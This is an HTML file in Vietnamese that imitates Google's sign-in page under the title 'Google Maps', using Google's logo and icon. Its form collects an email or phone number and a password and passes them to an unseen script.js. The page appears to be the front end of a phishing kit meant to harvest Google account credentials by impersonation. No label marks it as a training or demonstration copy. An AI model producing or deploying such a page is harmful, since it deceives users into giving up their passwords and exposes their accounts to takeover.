<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8" />
  <title>Google Maps</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
  <link rel="stylesheet" href="style.css" />
  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/a/aa/Google_Maps_icon_%282020%29.svg/1200px-Google_Maps_icon_%282020%29.svg.png" type="image/png">
</head>
<body>
  <div class="login-box">
    <img
      src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
      alt="Google logo"
      class="logo"
    />
    <h2>Đăng nhập</h2>
    <form id="loginForm" method="POST">
      <input type="email" name="email" placeholder="Email hoặc số điện thoại" required />
      <input type="password" name="password" placeholder="Mật khẩu" required />
      <button type="submit">Tiếp theo</button>
    </form>
  </div>
  <script src="script.js"></script>
</body>
</html>
